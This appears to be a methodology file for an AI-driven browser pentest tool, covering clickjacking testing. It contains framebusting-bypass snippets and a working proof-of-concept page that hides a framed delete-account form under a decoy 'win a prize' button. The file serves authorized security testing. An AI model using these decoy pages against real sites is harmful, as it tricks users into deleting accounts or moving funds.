---
name: "clickjacking"
description: "Clickjacking / UI Redress Testing"
version: "1.0.0"
author: "void-extension"
tags: ["pentest", "clickjacking", "ui-redress", "framing", "x-frame-options", "csp"]
trigger_patterns:
  - "/clickjacking"
  - "test clickjacking"
  - "test framing"
  - "ui redress"
  - "x-frame-options"
  - "frame-ancestors"
---

# Clickjacking Testing Methodology

Test whether an application can be framed by an attacker-controlled page,
enabling UI redress attacks where a victim clicks hidden elements (buttons,
forms, toggles) believing they are interacting with the attacker's visible page.

## Scope and preconditions

Applies to any web page that performs state-changing actions (delete account,
change email, transfer funds, grant permissions) and is served in a browser.

It does **not** cover: CSRF via form submission without framing (use `csrf`),
open redirect (use `redirect`), or DOM-based attacks (use `dom-xss`).

## Rules of engagement

- NEVER perform actions on real user accounts through a framing PoC. Build the
  PoC against your own test session.
- The PoC must be a standalone HTML file that demonstrates the attack — not just
  a missing header report.
- Record the exact response headers and the PoC HTML with `add_pentest_finding`.

## Workflow

- [ ] 1. Check framing headers on target pages
- [ ] 2. Identify high-value frameable pages
- [ ] 3. Test framebusting bypass techniques
- [ ] 4. Generate and verify PoC
- [ ] 5. Assess severity and report

## Step 1: Check framing defences

### Actions

Use `send_request` to fetch key pages (login, settings, admin panels, any
state-changing page). Check response headers:

| Header | Secure values | Frameable? |
|--------|--------------|------------|
| `X-Frame-Options: DENY` | Page cannot be framed | No |
| `X-Frame-Options: SAMEORIGIN` | Only same-origin frames | Only from same origin |
| `Content-Security-Policy: frame-ancestors 'none'` | Equivalent to DENY | No |
| `Content-Security-Policy: frame-ancestors 'self'` | Equivalent to SAMEORIGIN | Only from same origin |
| Neither header present | No protection | **Yes** |
| `X-Frame-Options: ALLOW-FROM` | Deprecated, ignored by Chrome/Edge | **Yes** in modern browsers |

Use `search_responses` to scan all captured responses for `X-Frame-Options` and
`frame-ancestors`. Any page missing both is a candidate.

### Important: per-page check

Framing headers may be set globally but missing on specific pages (error pages,
API endpoints rendering HTML, legacy pages). Check at least:
- Login page
- Settings / profile page
- Any page with a destructive action (delete, transfer, permission change)
- Admin panel pages

## Step 2: Identify high-value targets

Not all frameable pages are findings. Prioritise by action:

| Action on frameable page | Severity |
|--------------------------|----------|
| Transfer funds / payment | Critical |
| Change email/password | High |
| Delete account | High |
| Enable/disable MFA | High |
| Grant admin permissions | High |
| Change settings / preferences | Medium |
| Like / follow / subscribe | Low |
| Static content, no actions | Not a finding |

## Step 3: Framebusting bypass

If the page uses JavaScript framebusting instead of headers:

```javascript
if (top !== self) { top.location = self.location; }
```

### Bypass techniques

**sandbox attribute** — the most reliable bypass:
```html
<iframe src="https://target.com/settings" sandbox="allow-forms allow-scripts"></iframe>
```
Omitting `allow-top-navigation` prevents the framebuster from redirecting the
parent. The framed page's scripts run but cannot escape the frame.

**Double framing:**
```html
<!-- attacker.html -->
<iframe src="attacker-inner.html"></iframe>

<!-- attacker-inner.html -->
<iframe src="https://target.com/settings"></iframe>
```
Some framebuster scripts only check `top === self`, not the full ancestor chain.

**onbeforeunload cancellation:**
```html
<iframe src="https://target.com/settings" id="target"></iframe>
<script>
window.onbeforeunload = function() { return false; };
</script>
```

**204 flush (IE/legacy):**
```html
<iframe src="https://target.com/settings" onload="this.src='about:blank'"></iframe>
```

Use `eval_page` to check if the target page has JavaScript-based framebusting
and what technique it uses.

## Step 4: PoC generation

Build a minimal HTML PoC:

```html
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC - [Target Action]</title></head>
<body>
<h1>Click the button below to win a prize!</h1>
<div style="position:relative; width:500px; height:400px;">
  <iframe src="https://target.com/settings/delete-account"
          style="position:absolute; top:0; left:0; width:500px; height:400px;
                 opacity:0.0001; z-index:2;"
          sandbox="allow-forms allow-scripts">
  </iframe>
  <button style="position:absolute; top:200px; left:150px; z-index:1;
                 padding:20px; font-size:18px;">
    Click here!
  </button>
</div>
</body>
</html>
```

Set `opacity: 0.3` during development to align the button, then drop to
`0.0001` for the final PoC.

### Multi-step clickjacking

For actions requiring multiple clicks (confirm dialog), use JavaScript to
reposition the iframe after each click:

```javascript
document.getElementById('target').style.top = '-200px'; // shift to next button
```

## Step 5: Verification

Use `eval_page` or open the PoC in a browser to confirm:

1. The target page loads inside the iframe (not blocked by headers).
2. The clickable element aligns with the decoy button.
3. Clicking the decoy triggers the real action on the target.

## Severity reference

| Finding | Severity |
|---------|----------|
| Frameable page with financial action (transfer, payment) | Critical |
| Frameable page with account takeover action (change email/password) | High |
| Frameable admin action (grant roles, delete users) | High |
| Frameable page with MFA disable | High |
| Frameable settings page (non-critical changes) | Medium |
| Missing X-Frame-Options but no actionable content | Low |
| ALLOW-FROM used (deprecated, no modern browser support) | Medium |

## Known false positives

- The page loads in the iframe but has a CSRF token that rotates — if the token
  is embedded in the form and submitted with the click, CSRF tokens do NOT
  prevent clickjacking. The click submits the real form with the real token.
- `X-Frame-Options: SAMEORIGIN` reported as missing when `frame-ancestors 'self'`
  is present in CSP — CSP takes precedence; this is not a finding.
- The page renders in the iframe but the action requires re-authentication
  (password confirmation) — this is a mitigating control; note it but reduce
  severity.
- Login page is frameable — only a finding if login CSRF is also possible
  (attacker logs victim into attacker's account).

## Tooling note

This methodology is designed for the Void panel tools (`send_request`,
`compare_responses`, `search_responses`, `eval_page`, `get_scripts`,
`add_pentest_finding`). These are browser-extension APIs, not shell commands.
Do not attempt to run CLI tools.
